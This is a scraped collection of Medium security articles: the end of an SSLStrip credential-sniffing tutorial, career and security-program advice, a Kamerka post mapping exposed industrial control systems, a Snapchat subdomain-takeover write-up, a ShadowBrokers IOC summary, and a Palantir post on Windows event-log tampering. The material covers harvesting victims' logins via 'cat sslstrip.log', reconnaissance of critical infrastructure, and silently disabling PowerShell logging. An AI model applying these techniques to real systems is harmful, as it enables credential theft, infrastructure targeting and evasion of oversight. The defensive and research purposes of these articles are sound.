Now this is a huge threat because as soon as the website becomes an http website then the traffic doesn’t remain encrypted anymore and all data is transferred in plain text. And cause we have already setup a listener on our Kali machine so we can catch all the traffic on our machine and then figure out the login credentials of the victim.
The example is below where the victim visits Facebook but the website is still http and SSL encryption is missing from the page.
After few minutes or hours when the listener is up we can find the captured details by typing in the following
cat sslstrip.log
This enables us to find every login credentials the user might have used to login the respective websites. The best thing about this whole process is that the user might not even realise that the traffic is compromised as long as they don’t check the URL.
So, the thing we need to understand is that these attacks can very well take place without the victim ever realising that they have been hacked.
As precaution DO NOT USE INTERNET EXPLORER, as browser like Firefox encrypts the traffic and the attacker won’t be able to decrypt the traffic to figure what it actually means.
Use add-ons like “ HTTPS everywhere ” which informs you every time you visit a website whether the website is using a secure SSL connection or not.
HTTPS Everywhere (Mozilla Firefox) & HTTPS Everywhere (Google Chrome)
If you enjoyed it please do clap & let’s collaborate. Get, Set, Hack!
Website : aditya12anand.com | Donate : paypal.me/aditya12anand
Telegram : https://t.me/aditya12anand
Twitter : twitter.com/aditya12anand
LinkedIn : linkedin.com/in/aditya12anand/
E-mail : aditya12anand@protonmail.com
P.S. Please do visit this link for better understanding JackkTutorials SSL Strip
Written by
","['Archive', 'ABOUT US', 'Bug Bounty', 'CTF', 'Discord Server', 'Interviews', 'Discord Group', 'Hacking', 'Ssl', 'Cybersecurity', 'Network Security', 'Computer Security']"
Starting in cybersecurity? - Just another infosec blog type of thing,https://blog.0day.rocks/starting-in-cybersecurity-5b02d827fb54?source=tag_archive---------9-----------------------,"You are looking to start a technical career in infosec or cyber? You are curious about how things work and have thirst in learning new skills? Great! Let’s get started then �
A true computer hacker is someone able to develop its own tools in an elegant way. Unlike the script-kiddies — that by definition are just kids using other people’s scripts — a talented hacker must 1) comprehend what a script/tool is doing and how it basically works 2) able to develop its own tools when needed and first and foremost 3) understand the basics of IT: do you know how a computer is generally working? This is not that easy to be honest. Could you list what are the network stacks used in modern computing? You should definitely look it up and learn the basics, otherwise you’ll get overwhelmed looking at security specific topics.
That is why, before doing anything «security» related (pentesting, bug hunting, reverse engineering, etc.) I highly recommend knowing the basics: learn computer programming. Learn C, Python and x86 (in that order or not).
C is the mother of all native languages, with its strength and weaknesses. Linux is built in C. Windows kernel is built in C. And C is the natural introduction to its big brother C++ on which a lot of software rely on (userland Windows for example). I strongly advise you to learn C, you just cannot ignore how widespread it is.
Python is the most important scripting language in the community and one of the most rapidly growing programming language (see image below). It has a lot of interesting modules already ready for you to enjoy. It’s very handy to write quick PoCs and most people in the community will understand Python. Alternatively you can learn Ruby that is also very much used (ie. Metasploit framework): pick your poison.
Finally, x86/x64 Intel assembly is a must-have if you want to know the basics of reverse engineering. Nowadays very few people actually code in assembly code, but native compiled code can be reverted in assembly code… which you might want to understand to reverse and understand binary files (executables).
You don’t need to master these three languages, but at the very least be familiar with them. There are plenty of decent tutorials that you can find on Google.
Here is a curated list of awesome information security resources with tons of courses and links:
Not everything is technical. Being a hacker is more about the mindset than the actual knowledge (in my opinion).
Read hacking zines like Phrack. There are some classics out there that you cannot miss. You’ll learn a lot reading them. Don’t get overwhelmed by the technical details, you can’t (and no one can) know everything about anything. Read what you like and find useful to you.
Hacker’s Manifesto: http://phrack.org/issues/7/3.htmlArchive of zines: https://github.com/fdiskyou/Zines
Also, watch movies for hackers! ☠️�
So now, do you want to get into malware research and reverse engineering? Pentesting? Or web application security? Maybe the most difficult thing to do, is to choose a starting topic. You cannot master all the things — so pick the one you like the most and start with this.
If you’re more into vulnerability research (memory bugs, buffer overflows, etc.), this book is the reference and a great starter:
If you’d rather reverse engineer malware and understand their inner working, Malware Analyst’s Cookbook is also a great start:
Also read the Reverse Engineering Malware 101 courses by @malwareunicorn.
If you’re more familiar with web technologies (HTML, JavaScript, CSS) and want to master the security aspects of web browsers:
There are dozens of other good books, but I haven’t read them all so I couldn’t recommend them myself.
I personally think most certifications are useless. If you need a certification to work at {Cool Company Inc.}, their hiring process is broken and they should know better.If you really need (or want) one certification, I’m willing to endorse OSCP which is fairly advanced and well known. Forget about CEH and all other expensive EC-Council crap certifications. Please don’t give them any credit. And don’t become these guys:
Get in touch with others on Twitter, IRC, Jabber etc. Don’t be shy and ask for help! Only thing… Google it first!
Feel free to buy me a coffee ☕ if you liked this article!
Written by
","['Cybersecurity', 'Learning', 'Hacking']"
Starting Up Security: From Scratch - Ryan McGeehan - Medium,https://medium.com/@magoo/starting-up-security-from-scratch-6f9a41199a65?source=tag_archive---------2-----------------------,"Did you just get asked to own “security” for your company?
We can mimic what other companies do and copy into a similar security program of our own. This is certainly better than nothing, though this won’t take into account how your risks are unique to others.
With some work, we can build something better. This article is about exploring risks before we start building.
Consider this a prequel to Starting Up Security.
Security is more of a attribute of a company than an organization. Having a great understanding of risk will help you build this program to be inherently cross functional with less resistance to change.
To truly start up security, you should be able to articulate a strategy based on the risks and threats around you.
A good Chief Security Officer can use this approach to result in a program like the one described in Starting Up Security. It describes their first month on the job, selecting and prioritizing risks to mitigate.
Let’s design a security program from scratch.
Start with a series of conversations around risks, threats, and fears, followed by a complete enumeration of the technology we depend on. This is called a risk assessment and very thorough frameworks exist to perform them.
Careful: Don’t limit security to a single risk, product, or technology. Narrow programs are formed this way.
A risk is the potential that something of value will be lost. This is sometimes calculated by considering the impact of a loss and the probability of a loss.
“The lock to the vault could be broken. “
A threat is the thing that will cause you to lose it.
“A cat burglar with a set of lock picks and plenty of time could break that lock.”
A fear is a perception of risk. Fears may help discover risk, but they might not actually get you to the right threats and instead reveal vulnerability.
“I’m afraid someone could rob the vault because sometimes we forget to lock it.”
Interview your veterans and leaders and ask them about close call incidents and war stories so far. Ask about any embarrassing practices that keep them up at night.
Find out who has the most privileged access in the company. Interview them. Ask them who else has what access, how often they actually use it, and who shouldn’t be trusted with the same. How could they abuse it, and what would be abused? Who would notice?
Ask executives the same questions. Ask them what risks they think you’re supposed to be working on. What do they think are existential risks to the business? You’ll probably find that “Security’s job” is a totally dependent on who you ask. It will end up being close to a sum of these views.
Who hires and fires people at your company? How is access given and taken away? These roles influence security in a growing company pretty significantly.
For interviews with communications or PR: Swap your company name with the names of breached companies in Brian Kreb’s blog, or an FTC enforcement. Once they see what a bad headline looks like, have a conversation about what you could or could not recover from.
What do your users view as your biggest risks? How could you poll your users? They will broadly vote for “duh, their data” as your biggest risk, but which bit of data specifically? Is data inconsistently stored and secured? Would a criminal hacker say your risks are any different? What about a state in conflict, what would they want to breach?
Output: You’ll be informed of how your company perceives risk.
Spend time enumerating the anatomy of all technology at your company. If you can interview every major technology owner from IT to software engineering to infrastructure, do it. Get a high level of how data (as an abstract concept) moves from place to place, in and out of your systems. This movement of data around your architecture is how a good security mind will think.
When do their employees gain and lose the authorization to access what data?
Where is that data geographically located when at rest? Is it encrypted? Where are the keys? Who has access to those keys? Who made those keys?
As you go about this, keep an eye on the perception of monetary value in the company. Try to imagine what would be sold first if you were to liquidate. You can imagine the monetary loss from sporadic power outages and hardware failures, people getting hit by buses, or a fatal bug in just the right bit of code. What would be valuable to a competitor?
How is new code written? How are bugs fixed? How is code released and shipped? How are updates pulled down to a client?
Who are the vendors that our company is dependent on? Your IT team will know of a few. A contracts lawyer may know more. Your finance team may know most. Then figure out what vendors are most important to the business or to your users and customers.
At this point the theme of these questions should become clear. You simply want to know how data gets around.
Output: You’ll begin to understand the company as a set of risks and moving parts.
Once you’ve become more familiar with the internals of the company and its risks, now we can model the threats to each risk.
Enumerate your probable, practical threats. There are many threat modeling approaches, some designed for startups. What, (or who), are the most probable ways that your biggest risks will be threatened?
A way to expedite this is to become familiar with common types of attackers. Most modern threats are weaponized to take advantage of common opportunities:
These very common threats result in very common mitigations. This is why a copycat approach to security is still viable, though incomplete.
Consider how Target likely appreciates their vendor security very differently after their HVAC systems were breached, and this area would have more consideration in threat modeling. Or, Bitcoin companies worry about cryptographic threats to key material more than others.
Consider your own oddities that could surface unique threats. This is when your security program starts to look different than everyone else’s.
Now that your risks have some well understood threats, organize this global set of risks for priority. Start with some example groupings:
For #3, write down everything else. Intentionally ignore them. We’re not going to focus on our employees being shoulder surfed, or if a boogeyman might leave a malicious USB key on their desk. Those are big company security problems.
Present the results from #1 and #2 to your leadership, your peers, and anyone involved with this process. You want consensus that these risks are worth mitigating and that cooperation will happen. Security is a horizontal responsibility, not an organization. You depend on this consensus to prevent a temporary interest in security.
With our input of risks, we need to decide on an output of mitigations. We’ll choose mitigations that have the deepest reduction of impact and probability on as many identified risks, and put them earliest on the roadmap.
Example: If an engineer’s laptop could get owned by a drive by exploit… should I focus on hardening their host to prevent exploitation, detecting misbehavior on the network after exploitation, or multi-factoring their authentication methods assuming they’ve been stolen?
Answer: Multi-factor will defend against so many other threats we’ve predicted, that it has become the highest priority mitigation.
One approach is to consider the “kill chain” for your threats, and where many of them overlap.
Most attacks (even “sophisticated” ones) are preceded by a series of events that can be detected or prevented. For instance, they all want some level of persistence (ex: malware), some method to move laterally (ex: domain / account takeover), some way to discover employee targets (ex: Searching LinkedIn).
If you consider hundreds of varying attacks, there may be very common steps that all of them would implement. A stolen key for SSH authentication, for instance, would be required for many other attacks that pivot deeply into your infrastructure. Thus, multi-factor authentication becomes highly valuable as it would prevent a wide constellation of attacks involving that form of lateral movement.
Security teams at competing companies usually want to work with each other and share information on known adversaries they’ve caught red handed. This is a huge way to avoid speculative threat modeling.
Collaborate with other security teams.
Example: If a different security team in your industry just suffered a product leak to a common social engineering gang, it may be a great time for a tactical email to employees with a heads up to be suspicious of email and to build a place to report it. If they re-use a domain or technique, may as well attempt to block it.
Generally though, find security teams that are nearby your company in technology or industry, and take them out for pizza.
If you read any of the articles I’ve written, all of them will slow down the company. End of story. There are bright spots every so often where a security team speeds things up, but that’s rare.
No one wants to go for a run before work, or eat their vegetables, or see the doctor once a year, or regularly review their credit card statements. It’s all friction against how we want to spend our day. The very same with people trying to do their job in a company when security comes around with a bunch of changes.
But, in hindsight, these preventative measures are often worth it.
That means when you ask engineers to change their workflow for this vague and nebulous “security” thing… consider what you sound like. If you arrive as a group on a set of risks, this process is smooth. When you can describe the risk and threats to the person impacted by the change, it will then be an implementation challenge and hardly a political one.
If our roadmap generates logs, who looks at the alerts we raise? Do we hire a team or junior analysts to watch logs all day?
First, avoid solutions where centralized alerts happen at all. Try to ship off alerts directly to the employees that are impacted and let them figure it out. Or, announcing high value alerts to a slack channel where a group can casually discuss an alert.
For the rest: the best answer I’ve seen here is a rotation. Lots of small engineering teams do bug rotations, support rotations, etc., on a weekly basis. If there are no active alerts or fires for the current rotation, that person makes the rotation easier for the next person.
An early security team will own a fire hose of incidents, bugs, risks, and opportunities to for improvement. Host infrequent meetings with the right leadership as part of your roadmap to discuss your top 1% of nasty risks you’ve uncovered. For a wider audience, newsletters, or just a regular drip of “Hey @here check out this nasty bug someone found!” in slack will go a long way.
One way is to avoid committing to share this content formally, but to instead commit to social time between the teams with continuous risk. This content will share itself with proximity between teammates. Take ’em out to lunch.
Security carries a burden of needing to be constantly secure. However, high performance groups and individuals (product teams, athletes, etc.) usually “peak” at designated times to meet a demand. Security teams awkwardly peak after an incident, or after a red team.
A boxer has the advantage of knowing when their fights are, and plan for them. They’d still be pretty nasty if they had to throw down in the meantime.
Scheduling “incidents” into a roadmap will have a similarly positive effect.
The only time you truly know how you’re doing is if you’ve been hacked. This sucks. Metrics in security have been heavily explored, but are borderline useless compared to the leaps that come from incidents.
The answer is to introduce red teams, tabletop exercises, or some other similar “hostile” event, as a milestone near the end of a roadmap. Challenge the controls you’ve just built somehow. Let this be a chance to fire the new guns at something. Otherwise, it’s a serious bummer to build security infrastructure without a guaranteed attacker.
It’s almost unfair that product teams get instantaneous feedback through growth metrics and revenue and all sorts of glorious engagement data. Product teams also work off of non-arbitrary deadlines based on a market, user demands, competition, etc. It makes security project deadlines look made up, or made with a continuous “we needed this yesterday” attitude.
A scheduled attack that is timed with a roadmap helps motivate a true production mentality and improve focus. A team will know that the mitigation they are building could catch a bad guy right away, which is a very satisfying aspect of working in security.
Afterward, you have a perfect time for a Hackathon, a pet project, or a tabletop exercise to revisit risk and threat models. It is a great way to iterate while still hitting peaks as a team.
It is greatly preferable to plan for peaks instead of expecting greatness 365 days a year.
It’s important to start a program with a consensus on the wide view of risks and threats. We learn how it all moves, we decide on our risks, and we agree on the fixes as a group. This approach helps avoid cold feet or negligence once it’s time to actually do the hard security work. Once you’ve put this momentum into a roadmap, it should be easier to run a security program that goes to war on a schedule.
I’m a security guy, former Facebook, Coinbase, and currently an advisor and consultant for a handful of startups like HackerOne. Incident Response and security team building is generally my thing, but I’m mostly all over the place.
Written by
","['MITM', 'be accessed', 'anonymous user', 'Cybersecurity', 'Tech', 'Startup']"
State of Industrial Control Systems in Poland and Switzerland,https://medium.com/@woj_ciech/state-of-industrial-control-systems-in-poland-and-switzerland-656e2e363fe3?source=tag_archive---------4-----------------------,"TL;DR New update for Kamerka allows to map Industrial Control Systems of whole country. As in previous version, interactive map is created but this time Google Street View has been added in order to take you for a virtual walk near found ICS devices.
I will present final map and some statistics on the example of Poland and Switzerland.
Code is still here → https://github.com/woj-ciech/kamerka
Industrial Control Systems (ICS) are systems/devices that are responsible for managing factories, power plants, hospitals or even traffic lights. Everyone knows how fragile these systems are and how outages may disrupt normal functioning of a city or country. The most famous cyberattack against ICS (except Stuxnet) had place in Ukraine in 2015 with BlackEnergy malware, however it’s not only strain of malicious software attacking ICS. Next example can be Industroyer or Triton, which code has been leaked and was analyzed, I recommend you to read the analysis to know how complex it is what damage it can cause.
In general, ICS shouldn’t be connected to the Internet but in order to save money, companies allow technicians remote access to this systems and create additional risk. Moreover, ports like HTTP, FTP, SSH, SNMP are accessible which potentially makes machine more vulnerable to different attacks. I even came across machines with VNC or SMB open. It confirms bad security practices and lack of network segregation.
Knowing history, i.e. attack on Ukraine, one should pay more attention to things that are exposed to the internet with other services that might help attackers to compromise machine or exfiltrate data in other way. Current Kamerka update gives you possibility to enumerate ICS device in specific country including localization and Google Street View photos.
Now it is fully functional recognize-intelligence gathering platform for specific location or Industrial Control Systems. It can be used in two parts, first enumerates localization of ICS and second part looks for cameras and social media photos nearby previously found industrial systems. This way you can gather full geo-intelligence (localization, cameras in neighborhood, google street view and social media photos) and also data intelligence (IP address, hostnames, services or open ports).
First version of Kamerka included only exposed cameras, then social media photos have been added and now you have possibility to visualize Industrial Control Systems of any country. The data source is still Shodan and following filter are used:
(with additional filter „country” with two letter short code of country as a value.)
Which means that following devices and products are checked:
It checks whether specific port is open or if device is a product like „Niagara Fox” or „Mitsubishi”. To be perfectly sure that this is ICS, script looks for „ics” tag in Shodan’s response. Then, with help of Folium library, map is created with photos from Google Street View.
You need additional API key for Google with Street View with billing activated.
Most of the location points to unspecified buildings, but in some cases I was able to find hospitals or power plants. Additional link to Shodan has been added to get more knowledge about particular host. It’s worth to mention that every host requires additional research, you can check what exactly belongs to this network with filter „net:IP” or what other devices are located in this place with „geo:LAT,LONG,RADIUS” filter.
I had to connect couple filters into one in order to save API credits. From this same reason, only first page is checked, sometimes is enough knowing there are only 40 Niagara Fox devices in Poland. Each of the filter can be substituted with one „tag:ics” but it’s only available in enterprise version. If you need to adjust the script to enterprise version, let me know.
Following research is based on aforementioned limitations.
Poland is very specific country because of it’s localization, which is in the middle of the Europe and creates sort of bridge between East and West. It is also interesting study case to show whether Poland can be second, after Ukraine, industrial cyber-battlefield.
Based on previously mentioned filters I enumerated 253 machines running different Industrial Control Systems, then I took geolocation and visualize it in form of map with clusters. Based on this, you can gather info where systems are located, if not exact location at least city is extracted.
I started this research with hope to find lot of power plants, factories and test their physical security with Google Street View and exposed cameras pointing this specific place. I found only couple places like factories or hospitals and rest of them are just completely other places, it’s also good study to show how geolocation data are precise, or not.
The map below presents industrial systems found on Shodan.
We can clearly see more „urbanized” places like Silesia (South part) and capitol Warsaw (central east). Each color means different systems, for instance orange is for Niagara Fox. If you have found actual plant or interesting place worth to visit, you can click „Go for a walk” which takes you to this specific location in Google Street View.
If you believe you have found place where industrial control systems are running, you can examine it’s physical security. By this I mean, entrances of the building, windows, security cameras or parking lots nearby. It’s good to have tool for red team assessments to plan operation.
Another security aspect of ICS security is the server itself. A lot of machines has additional ports open, mostly it is HTTP with login pages, which reveals manufacturer and version of the software. This presents another risk in form of default credential use and vulnerability check.
As presented most pages operates on ports 80,81,8080,8081 without HTTPS.
Kamerka gives you insight what other services and ports are open on the machine. Apart from above mentioned HTTP/S (80,443,8443,8080), devices in Poland expose SSH (22), FTP (21), VNC (5900) SNMP (161) and PPTP (1723).
Next chart presents use of each Industrial Control Systems manufactures, you can find full list of checked products and the beginning of article. We see that large part is covered by Codesys, second place is for Modbus and on third place Niagara Fox is located. It clearly shows that there is no sense to develop malware and attack BACnet systems since only 11 machines are located in Poland.
To compare the results I took small western country with lot of potential and allegedlly being neutral — Switzerland. Script was able to find 199 machines.
Geolocation of ICS is presented below
„Exposed ports” chart presents that telnet is still in use in 25 cases (in Poland it was 12) and also DNS runs on 16 machines (11 in PL). Still lot of HTTP ports are open, 31 FTP and 10 SSH.
Results of ICS products are very similar to the Polish ones. Leader is port 2455, which Codesys operates on. Modbus and Niagara Fox are on the next places. It happens that some of the machines has more that one ICS port running that why total number is higher than number of machines.
Even with the mentioned limitation, it was possible to enumerate the trends in products and manufacturers. If we add location of the servers, we can precise it to specific organizations and buildings. At the end we can finish with total intelligence report for specific country including the most interesting cities or places, with social media photos, Street View and cameras in neighborhood.
If someone need access to raw data or map from this research, please let me know.
Attack or defense, both sides need good intelligence especially when fragile and very sensitive systems like ICS are in play. Functioning of the city/country depends of these devices and lives may be in danger in case of outage or intentional cyber-destruction. That’s why it is important to monitor every device connected to the internet which might pose risk to the factories, plants, hospital, airplanes or other important structure of the country.
Written by
","['Cybersecurity', 'Hacking', 'Intelligence', 'IoT']"
Subdomain takeover of blog.snapchat.com - HackerNoon.com - Medium,https://medium.com/hackernoon/subdomain-takeover-of-blog-snapchat-com-60860de02fe7?source=tag_archive---------2-----------------------,"Snapchat does not have a lot of public facing subdomains, as of right now a basic subdomain scan on pentest-tools.com shows only 13 subdomains (compared to 799 for Facebook). I figured with a high profile bounty program like Snapchat these would be tested pretty hard and decided not to bother. However, I’ve been doing some Wordpress hacking lately and blog.snapchat.com caught my eye.
The DNS record for blog.snapchat.com shows a CNAME record and some logic pointing to snapchat-blog.com, which resolved to the below page.
I have limited experience with Tumblr but I assumed this was an unclaimed blog page. My first guess was that in the background they were pointing to some website like snapchat.tumblr.com, but that blog was already taken, so this was wrong.
After some digging I found out Tumblr has the same custom domain setup as many other websites:
I was able to verify this by nslookup, seeing that snapchat-blog.com pointed to 66.6.32.21, an IP owned by Tumblr for custom domain routing.
Viewing Google’s cached copy of this page shows this domain was properly claimed the day before (9/24). Snapchat must have accidentally removed the custom domain claim from their Tumblr account in the last 24 hours, probably in preparation for switching to snap.com/news for their recent re-branding.
After I figured out how Tumblr handled CNAMEs it was as easy as going to my account settings and claiming the domain name.
Visiting blog.snapchat.com (which redirects to snapchat-blog.com) then showed the following
I decided to put my name on this subdomain for a valid PoC, narcissism, and to aid Snapchat in fixing the vulnerability if they did not see the Hackerone report first. This ultimately led to me not receiving a bounty, since I did not handle this in a quieter matter. That was not my initial intention, but I can understand their position.
9/25/16
9/26/16
10/4/16
10/5/16
Thank you to Snapchat for the quick response time and for running such a great bug bounty program. If you are interested in their program please visit https://hackerone.com/snapchat.
Hacker Noon is how hackers start their afternoons. We’re a part of the @AMI family. We are now accepting submissions and happy to discuss advertising & sponsorship opportunities.
If you enjoyed this story, we recommend reading our latest tech stories and trending tech stories. Until next time, don’t take the realities of the world for granted!
Written by
","['About', 'Help', 'Go Home', 'Medium', 'Custom Domains', 'Hacking', 'Penetration Testing', 'Cybersecurity']"
Summary of the latest ShadowBrokers release (+IOCs),https://medium.com/@msuiche/summary-of-the-latest-shadowbrokers-released-iocs-2d0718841644?source=tag_archive---------9-----------------------,"In 2015, Kasperky published an analysis of the EquationDrug platform — Yesterday, ShadowBrokers reappeared and published files related of the EquationDrug implants before claiming they would disappear again.
Yesterday, I published a series of twitts to provide a quick analysis of the content of the archive which I managed to download before the website got shutdown (which looks to be back online today). Some were particularly interesting as they were credentials related.
Globally, the files are mainly modules — there are a total of 61 files in the ShadowBrokers’ archive. After a look at the 2015 Kaspersky report we can already picture how they interact with each other. The architecture is a plugin-based architecture that includes interaction with kernel mode components.
Most of modules have :
Kaspersky itself describe the EquationDrug as a group having activities in the late 90s and early 2000s.
EquationDrug is one of the main espionage platforms used by the Equation Group, a highly sophisticated threat actor that has been engaged in multiple CNE (computer network exploitation) operations dating back to 2001, and perhaps as early as 1996.
EquationDrug, which is still in use, dates back to 2003, although the more modern GrayFish platform is being pushed to new victims.
Although, the RSDS debug section had been stripped off. There are still TONS of debugging messages in the plugins, this function has to be my favorite — you can retrieve it in several modules. It contains a representation of hundreds of error messages. Who needs PDB files when you have debug messages ? It’s shocking to know that alleged NSA developers wrote a rootkit with so much debug information in it, it almost look like this is a prototype version which still had the _DEBUG flag on during compilation of the rootkit modules. Either that, or the developers were very simple minded back then as it can be seen in the GIF below.
In addition to the fact that Windows files and Unix tools would have no reason to be on the same staged server. The following snippet is a very strong argument supporting my insider theory from last summer.
One of the file (equation_drug_hashes.txt) accompanied with the archived contains the hashes and full file paths reinforcing that the files come from their original sources rather than a staged server due to the file hierarchy and naming convention of those folder names.
The file hierarchy and the unchanged file naming convention tends to say that the files were directly copied from it source. (…)There are no reasons for them to be on a staging server, as they would not serve any purpose.- Matt Suiche — 17, Aug, 2016
Also DSZOPSDISK is a root folder name that had been identified in EXTRABACON in the leak which happened this summer. Previously, in a Windows-like path syntax “ D:\DSZOPSDisk\logs” and currently as a Unix-like path syntax “DSZOPSDISK/Resources/…”.
This would mean ShadowBrokers handpicked the files to create the final archive in a flat hierarchy from those different folders. Probably to only give a sample of the EquationDrug files they have in possession.
Although, as we have seen in the previous section, the fact those files are really old (10+years) supposes that the insider only has old dirt on the NSA and probably left many many years ago.
Although, those files seem very old (10+ years old) most of them have poor detection rate as we can see below on VirusTotal — Only Kaspersky is able to identify those files as HEUR:Trojan.Win32.EquationDrug.gen.
Due to the poor detection rate by anti-virus as we just saw, you will need IOCs to verify if your Windows 2000, XP systems are still infected.
Here is a quick scripts that will allow you to generate your own IOCs.
This way you can generate your own IOCs, here are the list of IOCs for the ShadowBrokers’s EquationDrug files released yesterday.
PowerShell can also allow you to export them as a CSV files if required.
PS: If you are a security researcher, there are two weeks left for OPCDE_ Inaugural Edition in Dubai (26–27 April 2017) ! More information on www.opcde.com !
Written by
","['Security', 'Shadowbrokers', 'Cybersecurity', 'Russian', 'USA']"
"Tampering with Windows Event Tracing: Background, Offense, and Defense",https://medium.com/palantir/tampering-with-windows-event-tracing-background-offense-and-defense-4be7ac62ac63?source=tag_archive---------4-----------------------,"Event Tracing for Windows (ETW) is the mechanism Windows uses to trace and log system events. Attackers often clear event logs to cover their tracks. Though the act of clearing an event log itself generates an event, attackers who know ETW well may take advantage of tampering opportunities to cease the flow of logging temporarily or even permanently, without generating any event log entries in the process.
The Windows event log is the data source for many of the Palantir Critical Incident Response Team’s Alerting and Detection Strategies, so familiarity with event log tampering tradecraft is foundational to our success. We continually evaluate our assumptions regarding the integrity of our event data sources, document our blind spots, and adjust our implementation. The goal of this blog post is to share our knowledge with the community by covering ETW background and basics, stealthy event log tampering techniques, and detection strategies.
The ETW architecture differentiates between event providers, event consumers, and event tracing sessions. Tracing sessions are responsible for collecting events from providers and for relaying them to log files and consumers. Sessions are created and configured by controllers like the built-in logman.exe command line utility. Here are some useful commands for exploring existing trace sessions and their respective ETW providers; note that these must usually be executed from an elevated context.
This command details the configuration of the trace session itself, followed by the configuration of each provider that the session is subscribed to, including the following parameters:
From a detection perspective, EVENT_ENABLE_PROPERTY_SID, EVENT_ENABLE_PROPERTY_TS_ID, EVENT_ENABLE_PROPERTY_PROCESS_START_KEY are valuable fields to collect. For example, EVENT_ENABLE_PROPERTY_PROCESS_START_KEY generates a value that uniquely identifies a process. Note that Process IDs are not unique identifiers for a process instance.
The logman query providers command lists all registered ETW providers, supplying their name and GUID. An ETW provider is registered if it has a binary manifest stored in the HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Publishers\{PROVIDER_GUID} registry key. For example, the Microsoft-Windows-PowerShell provider has the following registry values:
ETW and the event log know how to properly parse and display event information to a user based on binary-serialized information in the WEVT_TEMPLATE resource present in the binaries listed in the ResourceFileName registry value. This resource is a binary representation of an instrumentation manifest (i.e., the schema for an ETW provider). The binary structure of WEVT_TEMPLATE is under-documented, but there are at least two tools available to assist in parsing and recovering event schema, WEPExplorer and Perfview.
The logman tool prints basic information about a provider. For example:
The listings shows supported keywords and logging values, as well as all processes that are registered to emit events via this provider. This output is useful for understanding how existing trace sessions filter on providers. It is also useful for initial discovery of potentially interesting information that could be gathered from via an ETW trace.
Notably, the PowerShell provider appears to support logging to the event log based on the existence of the reserved keywords in the high nibble of the defined keywords. Not all ETW providers are designed to be ingested into the event log; rather, many ETW providers are intended to be used solely for low-level tracing, debugging, and more recently-developed security telemetry purposes. For example, Windows Defender Advanced Threat Protection relies heavily upon ETW as a supplemental detection data source.
Another method for discovering potentially interesting providers is to view all providers to which events are written from a specific process. For example, the following listing shows all providers relevant to MsMpEng.exe (the Windows Defender service, running as pid 5244 in this example):
Entries listed with GUID are providers lacking a manifest. They will typically be related to WPP or TraceLogging, both of which are beyond the scope of this blog post. It is possible to retrieve provider names and event metadata for these providers types. For example, here are some of the resolved provider names from the unnamed providers above:
Looking at ETW-replated code snippets in built-in Windows binaries can help you understand how ETW events are constructed and how they surface in event logs. Below, we highlight two code samples, System.Management.Automation.dll (the core PowerShell assembly) and amsi.dll.
One of the great security features of PowerShell version 5 is scriptblock autologging; when enabled, script content is automatically logged to the Microsoft-Windows-PowerShell/Operational event log with event ID 4104 (warning level) if the scriptblock contains any suspicious terms. The following C# code is executed to generate the event log:
The LogOperationalWarning method is implemented as follows:
The WriteEvent method is implemented as follows:
Finally, the event information is marshaled and EventWriteTransfer is called, supplying the Microsoft-Windows-PowerShell provider with event data.
The relevant data supplied to EventWriteTransfer is as follows:
Upon receiving the event from the PowerShell ETW provider, the event log service parses the binary WEVT_TEMPLATE schema (original XML schema) and presents human-readable, parsed event properties/fields:
You may have observed that Windows 10 has an AMSI/Operational event log that is typically empty. To understand why events are not logged to this event log, you would first have to inspect how data is fed to the AMSI ETW provider (Microsoft-Antimalware-Scan-Interface - {2A576B87-09A7-520E-C21A-4942F0271D67}) and then observe how the Application event log trace session (EventLog-Application) subscribes to the AMSI ETW provider. Let’s start by looking at the provider registration in the Application event log. The following PowerShell cmdlet will supply us with this information:
The following properties should be noted:
This information on its own does not explain why AMSI events are not logged, but it supplies needed context upon inspecting how amsi.dll writes events to ETW. By loading amsi.dl into IDA, we can see that there was a single call to the EventWrite function within the internal CAmsiAntimalware::GenerateEtwEvent function:
The relevant portion of the call to EventWrite is the EventDescriptor argument. Upon applying the EVENT_DESCRIPTOR structure type to _AMSI_SCANBUFFER, the following information was interpreted:
The EVENT_DESCRIPTOR context gives us the relevant information:
We now understand that 1101 events not logged to the Application event log because it only considers events where the keyword value matches 0x8000000000000000. In order to fix this issue and get events pumping into the event log, either the Application event log trace session would need to be modified (not recommended and requires SYSTEM privileges) or you could create your own persistent trace session (e.g., an autologger) to capture AMSI events in the event log. The following PowerShell script creates such a trace session:
After running the above command, reboot, and the AMSI event log will begin to populate.
Some additional reverse engineering showed that the scanResult field refers to the AMSI_RESULT enum where, in this case, 32768 maps to AMSI_RESULT_DETECTED, indicating that the buffer (the Unicode encoded buffer in the content field) was determined to be malicious.
Without knowledge of ETW internals, a defender would not have been able to determine that additional data sources (the AMSI log in this case) can be fed into the event log. One would have to resort to speculation as to how the AMSI event became to be misconfigured and whether or not the misconfiguration was intentional.
If the goal of an attacker is to subvert event logging, ETW provides a stealthy mechanism to affect logging without itself generating an event log trail. Below is a non-exhaustive list of tampering techniques that an attacker can use to cut off the supply of events to a specific event log.
Tampering techniques can generally be broken down into two categories:
Tampering category: Persistent, requiring rebootMinimum permissions required: AdministratorDetection artifacts: Registry key deletion: HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\AUTOLOGGER_NAME\{PROVIDER_GUID}Description: This technique involves the removal of a provider entry from a configured autologger. Removing a provider registration from an autologger will cause events to cease to flow to the respective trace session. Example: The following PowerShell code disables Microsoft-Windows-PowerShell event logging:
In the above example, A0C1853B-5C40-4B15-8766-3CF1C58F985A refers to the Microsoft-Windows-PowerShell ETW provider. This command will end up deleting the HKLM\System\CurrentControlSet\Control\WMI\Autologger\EventLog-Application\{a0c1853b-5c40-4b15-8766-3cf1c58f985a} registry key.
